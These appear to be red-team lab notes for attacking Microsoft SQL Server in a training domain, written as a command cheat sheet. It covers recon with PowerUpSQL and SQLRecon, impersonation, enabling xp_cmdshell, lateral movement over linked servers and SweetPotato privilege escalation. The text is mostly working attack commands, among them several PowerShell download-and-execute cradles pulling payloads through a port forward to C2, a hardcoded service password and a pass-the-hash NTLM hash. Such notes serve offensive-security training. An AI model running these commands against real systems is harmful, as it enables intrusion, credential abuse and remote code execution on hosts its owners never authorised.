# MSSQL Recon

```bash
# Get instances
powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
powerpick Get-SQLInstanceDomain

# Test MSSQL connection
powerpick Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

# If Accessible we can gather information
powerpick Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

# Same can be done with SQLRecon
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

# Check permissions of current user
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

# If we know MSSQL password
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

# Finding user/group with permissions for MSSQL
powerpick Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
```

---

# MSSQL Impersonation

```bash
# Check who you can impersonate with your current user
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate

# Check privileges with that user
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc

# Enable command execution
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc

# Verify command execution
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
```

---

# Get Shell from MSSQL

```bash
# Enable port in firewall on compromised machine
powerpick New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# Start port forward on compromised machine to point to your C2
rportfwd 8080 127.0.0.1 80

# Check if SMB is enabled
portscan <target-ip> 445

# Make it execute smb_x64.ps1 script if not 445 open use DNS
encode 'iex (new-object net.webclient).downloadstring("http://wkstn-2:8080/bypass"); iex (new-object net.webclient).downloadstring("http://wkstn-2:8080/ab")' -c
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:"powershell -w hidden -enc dABuAD[...]BiACcAK="

# Look at the web-log in C2 and if se a hit link to the created pipe
link sql-2.dev.cyberbotic.io vgauth-service
```

---

# Lateral Movement to linked hosts

```bash
# Check for linked hosts
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links

# Test sending a query to a linked host
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"

# Check if command execution is enabled
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"

# IF RPC Out is enabled (which is not default) enable command execution
socks 1080 # Start socks proxy
mssqlclient.py mssql_svc@sql-2.dev.cyberbotic.io -hashes :ac548f25225b5e0974a79a59fc27fc2c -windows-auth
proxychains mssqlclient.py mssql_svc@10.10.122.25 -hashes :ac548f25225b5e0974a79a59fc27fc2c -windows-auth # Use ip of machine

EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]

# Check further links out of sql-1
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
#or
powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"

# Check privileges on linked host
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io

# IF after impersonating mysql-svc we have sa access to the linked host, we can run commands
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
rportfwd 8080 127.0.0.1 80

# Serving smb.ps1
encode 'iex (new-object net.webclient).downloadstring("http://sql-2.dev.cyberbotic.io:8080/bypass"); iex (new-object net.webclient).downloadstring("http://sql-2.dev.cyberbotic:8080/ab")' -c
EXEC('xp_cmdshell ''powershell -w hidden -enc Adg@[...]dfovj@#==''') AT [sql-1.cyberbotic.io]
link sql-1.cyberbotic.io vgauth-service
```

---

# Privilege escalation via MSSQL

```bash
# Check if impersonate token is available
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit

# If set, host tcp-local_x64.ps1 on /c and copy only base64 not the entire command
encode 'iex (new-object net.webclient).downloadstring("http://sql-2.dev.cyberbotic.io:8080/bypass"); iex (new-object net.webclient).downloadstring("http://sql-2.dev.cyberbotic:8080/c")' -c -l

# Run the command on sql-1
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc Adg@[...]dfovj@#===="

# Connect to localhost
connect localhost 4444
```
